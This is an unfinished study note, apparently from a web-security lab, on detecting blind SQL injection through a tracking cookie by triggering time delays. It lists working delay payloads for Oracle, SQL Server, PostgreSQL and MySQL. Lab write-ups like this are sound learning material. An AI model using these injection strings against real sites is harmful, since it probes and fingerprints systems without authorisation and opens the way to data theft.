**Exploiting blind SQL injection by triggering time delays**

*Vulnerable parameters - tracking cookie*
*- Goal:* prove that the web app is vulnerable with parameter cookie and Blind SQL base on time delays
*- Analysis:*
- Try what type of databse that the web used:
  `SELECT trackingId from trackingIdTable where trackingId='2RaW12NfteV9OqP9' || (SELECT pg_sleep(10))--`
> Oracle :	dbms_pipe.receive_message(('a'),10)
Microsoft:	WAITFOR DELAY '0:0:10'
PostgreSQL: 	' || (SELECT pg_sleep(10))--
MySQL: ' || (SELECT SLEEP(10))-- -x


CHUAW XONG